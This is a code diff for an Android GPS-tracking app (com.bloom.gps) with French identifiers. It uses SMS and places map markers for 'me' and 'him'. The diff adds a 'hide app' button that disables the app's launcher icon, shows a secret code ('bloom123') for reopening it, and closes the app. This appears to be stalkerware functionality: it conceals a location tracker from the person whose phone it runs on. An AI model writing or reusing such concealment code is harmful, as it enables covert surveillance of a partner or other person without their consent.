@@ -2,6 +2,7 @@ package com.bloom.gps
 
 import android.Manifest
 import android.content.BroadcastReceiver
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
@@ -14,6 +15,7 @@ import android.os.Bundle
 import android.telephony.SmsManager
 import android.widget.Button
 import android.widget.EditText
+import android.widget.ImageButton
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -38,6 +40,7 @@ class MainActivity : AppCompatActivity(), LocationListener {
     private lateinit var btnPermissions: Button
     private lateinit var btnStart: Button
     private lateinit var btnStop: Button
+    private lateinit var btnHideApp: ImageButton
     
     private var marqueurMoi: Marker? = null
     private var marqueurLui: Marker? = null
@@ -120,6 +123,7 @@ class MainActivity : AppCompatActivity(), LocationListener {
         btnPermissions = findViewById(R.id.btnPermissions)
         btnStart = findViewById(R.id.btnStart)
         btnStop = findViewById(R.id.btnStop)
+        btnHideApp = findViewById(R.id.btnHideApp)
     }
 
     private fun chargerNumeros() {
@@ -179,6 +183,25 @@ class MainActivity : AppCompatActivity(), LocationListener {
 
     private fun configurerBoutons() {
         btnPermissions.setOnClickListener { demanderPermissions() }
+
+        // ✅ BOUTON CACHER L'APPLICATION
+        btnHideApp.setOnClickListener {
+            sauvegarderNumeros() // Sauvegarde avant de cacher
+            
+            // CACHER L'ICÔNE DU TIROIR
+            val pm = packageManager
+            pm.setComponentEnabledSetting(
+                ComponentName(this, "com.bloom.gps.MainActivity"),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            
+            Toast.makeText(this, "🕵️ Application cachée !\nCode secret pour la retrouver : bloom123", Toast.LENGTH_LONG).show()
+            
+            // FERMER L'APP
+            finish()
+            moveTaskToBack(true)
+        }
 
         btnStart.setOnClickListener {
             val num = etAutreNumero.text.toString().trim()
